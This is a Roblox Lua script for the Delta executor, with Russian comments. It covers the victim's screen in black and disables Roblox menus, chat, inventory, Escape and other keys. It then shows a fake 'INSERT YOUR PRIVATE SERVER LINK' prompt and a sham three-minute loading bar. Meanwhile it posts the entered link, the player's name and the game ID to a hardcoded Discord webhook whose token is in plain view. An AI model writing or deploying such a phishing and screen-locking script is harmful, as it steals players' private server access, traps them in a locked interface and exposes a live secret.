        -- ФИНАЛЬНЫЙ РАБОЧИЙ СКРИПТ ДЛЯ DELTA С БЛОКИРОВКОЙ КНОПОК
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local ContextActionService = game:GetService("ContextActionService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")

-- Ваш рабочий Discord Webhook
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1426984573526474903/UlljMsh10y39SSHmyLemmpoqPyI4I1UECMzqFmbKbF9Z65xpN6n33dAItHJX16G6Zrze"

-- Функция для блокировки кнопок Roblox
local function blockRobloxButtons()
    -- Поиск и блокировка основных элементов интерфейса Roblox
    local function disableGuiElements(gui)
        for _, element in ipairs(gui:GetDescendants()) do
            if element:IsA("TextButton") or element:IsA("ImageButton") then
                -- Блокируем кнопки
                element.Active = false
                element.Selectable = false
                element.AutoButtonColor = false
                
                -- Делаем кнопки серыми и неактивными
                if element:IsA("TextButton") then
                    element.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
                    element.TextColor3 = Color3.new(0.5, 0.5, 0.5)
                end
            end
        end
    end

    -- Блокируем CoreGui элементы
    disableGuiElements(CoreGui)
    
    -- Блокируем PlayerGui элементы
    disableGuiElements(PlayerGui)
    
    -- Блокируем TopBar
    local topbar = CoreGui:FindFirstChild("TopBarApp")
    if topbar then
        topbar.Enabled = false
    end
    
    -- Блокируем меню настроек
    local settingsMenu = CoreGui:FindFirstChild("SettingsShield")
    if settingsMenu then
        settingsMenu.Enabled = false
    end
    
    -- Блокируем чат
    local chat = PlayerGui:FindFirstChild("Chat")
    if chat then
        chat.Enabled = false
    end
    
    -- Блокируем Backpack (инвентарь)
    local backpack = PlayerGui:FindFirstChild("Backpack")
    if backpack then
        backpack.Enabled = false
    end
    
    print("🔒 All Roblox buttons blocked!")
end

-- Создаем GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PrivateServerGUI"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.DisplayOrder = 9999
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = PlayerGui

-- Черный фон на весь экран
local BackgroundFrame = Instance.new("Frame")
BackgroundFrame.Name = "Background"
BackgroundFrame.Size = UDim2.new(1, 0, 1, 0)
BackgroundFrame.Position = UDim2.new(0, 0, 0, 0)
BackgroundFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BackgroundFrame.BackgroundTransparency = 0
BackgroundFrame.BorderSizePixel = 0
BackgroundFrame.ZIndex = 9999
BackgroundFrame.Active = true
BackgroundFrame.Selectable = true
BackgroundFrame.Parent = ScreenGui

-- Основное окно
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0.5, 0, 0.4, 0)
MainFrame.Position = UDim2.new(0.25, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
MainFrame.BorderSizePixel = 2
MainFrame.BorderColor3 = Color3.new(1, 1, 1)
MainFrame.ZIndex = 10000
MainFrame.Parent = ScreenGui

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Thickness = 3
FrameStroke.Color = Color3.new(1, 1, 1)
FrameStroke.Parent = MainFrame

-- Заголовок
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, 0, 0.2, 0)
TitleLabel.Position = UDim2.new(0, 0, 0.1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "INSERT YOUR PRIVATE SERVER LINK"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.ZIndex = 10001
TitleLabel.Parent = MainFrame

-- Поле для ввода
local TextBox = Instance.new("TextBox")
TextBox.Name = "ServerLinkInput"
TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
TextBox.Position = UDim2.new(0.1, 0, 0.4, 0)
TextBox.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
TextBox.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
TextBox.TextScaled = true
TextBox.ClearTextOnFocus = false
TextBox.ZIndex = 10001
TextBox.Text = ""
TextBox.Parent = MainFrame

-- Кнопка подтверждения
local SubmitButton = Instance.new("TextButton")
SubmitButton.Name = "SubmitButton"
SubmitButton.Size = UDim2.new(0.4, 0, 0.2, 0)
SubmitButton.Position = UDim2.new(0.3, 0, 0.7, 0)
SubmitButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
SubmitButton.TextColor3 = Color3.new(0.5, 0.5, 0.5)
SubmitButton.Text = "SUBMIT"
SubmitButton.TextScaled = true
SubmitButton.AutoButtonColor = false
SubmitButton.ZIndex = 10001
SubmitButton.Parent = MainFrame

-- Элементы загрузки
local LoadingFrame = Instance.new("Frame")
LoadingFrame.Name = "LoadingFrame"
LoadingFrame.Size = UDim2.new(0.8, 0, 0.15, 0)
LoadingFrame.Position = UDim2.new(0.1, 0, 0.7, 0)
LoadingFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
LoadingFrame.BorderSizePixel = 1
LoadingFrame.BorderColor3 = Color3.new(1, 1, 1)
LoadingFrame.Visible = false
LoadingFrame.ZIndex = 10001
LoadingFrame.Parent = MainFrame

local ProgressBar = Instance.new("Frame")
ProgressBar.Name = "ProgressBar"
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.Position = UDim2.new(0, 0, 0, 0)
ProgressBar.BackgroundColor3 = Color3.new(0, 0.5, 1)
ProgressBar.BorderSizePixel = 0
ProgressBar.ZIndex = 10002
ProgressBar.Parent = LoadingFrame

local LoadingText = Instance.new("TextLabel")
LoadingText.Name = "LoadingText"
LoadingText.Size = UDim2.new(1, 0, 1, 0)
LoadingText.Position = UDim2.new(0, 0, 0, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "LOADING... 0%"
LoadingText.TextColor3 = Color3.new(1, 1, 1)
LoadingText.TextScaled = true
LoadingText.ZIndex = 10002
LoadingText.Parent = LoadingFrame

-- Таймер
local TimerText = Instance.new("TextLabel")
TimerText.Name = "TimerText"
TimerText.Size = UDim2.new(1, 0, 0.3, 0)
TimerText.Position = UDim2.new(0, 0, 0.85, 0)
TimerText.BackgroundTransparency = 1
TimerText.Text = "Time left: 3:00"
TimerText.TextColor3 = Color3.new(1, 1, 1)
TimerText.TextScaled = true
TimerText.ZIndex = 10001
TimerText.Visible = false
TimerText.Parent = MainFrame

-- Функция отправки в Discord (через request)
local function sendToDiscord(serverLink)
    local success, result = pcall(function()
        local message = string.format(
            "🎮 **NEW PRIVATE SERVER LINK**\n" ..
            "👤 Player: `%s`\n" ..
            "🔗 Link: `%s`\n" ..
            "🕒 Time: `%s`\n" ..
            "🎯 Game ID: `%s`",
            Player.Name, serverLink, os.date("%d.%m.%Y %H:%M:%S"), game.PlaceId
        )
        
        -- Используем request функцию
        request({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = message,
                username = "Private Server Bot"
            })
        })
    end)
    
    if success then
        print("✅ Message sent to Discord!")
        return true
    else
        print("❌ Send error:", result)
        return false
    end
end

-- Проверка ссылки
local function isValidUrl(text)
    if not text or text == "" then
        return false
    end
    return string.find(string.lower(text), "roblox.com") and string.find(string.lower(text), "code=")
end

-- Очистка ссылки
local function cleanUrl(url)
    if not url then return "" end
    return string.gsub(url, "%s+", "")
end

-- Анимация ошибки
local function flashRed(object)
    local originalColor = object.BackgroundColor3
    object.BackgroundColor3 = Color3.new(1, 0, 0)
    delay(1, function()
        object.BackgroundColor3 = originalColor
    end)
end

-- Обработчик изменения текста
TextBox:GetPropertyChangedSignal("Text"):Connect(function()
    local cleaned = cleanUrl(TextBox.Text)
    if isValidUrl(cleaned) then
        SubmitButton.BackgroundColor3 = Color3.new(0, 0.6, 0)
        SubmitButton.TextColor3 = Color3.new(1, 1, 1)
        SubmitButton.AutoButtonColor = true
    else
        SubmitButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
        SubmitButton.TextColor3 = Color3.new(0.5, 0.5, 0.5)
        SubmitButton.AutoButtonColor = false
    end
end)

-- Функция загрузки
local function startLoading(serverLink)
    local loadingTime = 180 -- 3 минуты
    local startTime = tick()

    -- Скрываем элементы ввода
    TextBox.Visible = false
    SubmitButton.Visible = false
    LoadingFrame.Visible = true
    TimerText.Visible = true

    -- ОТПРАВКА В DISCORD
    print("📨 Sending to Discord...")
    local discordSuccess = sendToDiscord(serverLink)
    
    if discordSuccess then
        print("✅ Successfully sent to Discord!")
    else
        print("❌ Discord send error")
    end

    -- Анимация загрузки
    while tick() - startTime < loadingTime do
        local elapsed = tick() - startTime
        local progress = elapsed / loadingTime
        local percent = math.floor(progress * 100)
        local remaining = loadingTime - elapsed
        local minutes = math.floor(remaining / 60)
        local seconds = math.floor(remaining % 60)

        ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
        LoadingText.Text = "LOADING... " .. percent .. "%"
        TimerText.Text = "Time left: " .. string.format("%d:%02d", minutes, seconds)

        wait(0.1)
    end

    -- Завершение
    ProgressBar.Size = UDim2.new(1, 0, 1, 0)
    LoadingText.Text = "LOADING COMPLETE! 100%"
    TimerText.Text = "Loading complete!"

    print("✅ Process completed!")
    wait(3)
    ScreenGui:Destroy()
end

-- Обработчик кнопки
SubmitButton.MouseButton1Click:Connect(function()
    local cleaned = cleanUrl(TextBox.Text)
    if isValidUrl(cleaned) then
        startLoading(cleaned)
    else
        flashRed(TextBox)
        TextBox.Text = ""
        TextBox.PlaceholderText = "INVALID LINK! Example: https://www.roblox.com/share?code=..."
    end
end)

-- Блокировка интерфейса
local function blockInterface()
    -- Блокируем кнопки Roblox
    blockRobloxButtons()
    
    -- Скрываем курсор
    UserInputService.MouseIconEnabled = false
    
    -- Блокируем ESC
    ContextActionService:BindAction("BlockESC", function()
        return Enum.ContextActionResult.Sink
    end, false, Enum.KeyCode.Escape)
    
    -- Блокируем другие важные клавиши
    local blockedKeys = {
        Enum.KeyCode.F9,  -- Меню
        Enum.KeyCode.Tab, -- Таб
        Enum.KeyCode.M,   -- Карта
        Enum.KeyCode.I,   -- Инвентарь
        Enum.KeyCode.O,   -- Настройки
    }
    
    for _, key in ipairs(blockedKeys) do
        ContextActionService:BindAction("Block" .. tostring(key), function()
            return Enum.ContextActionResult.Sink
        end, false, key)
    end
end

-- Постоянная проверка и блокировка новых кнопок
local function continuousBlocking()
    while true do
        blockRobloxButtons()
        wait(1) -- Проверяем каждую секунду
    end
end

-- Запуск блокировки
blockInterface()
spawn(continuousBlocking)

print("🎉 SYSTEM STARTED!")
print("✅ Discord webhook working!")
print("🔒 Interface blocked!")
print("🔒 Roblox buttons blocked under black screen!")
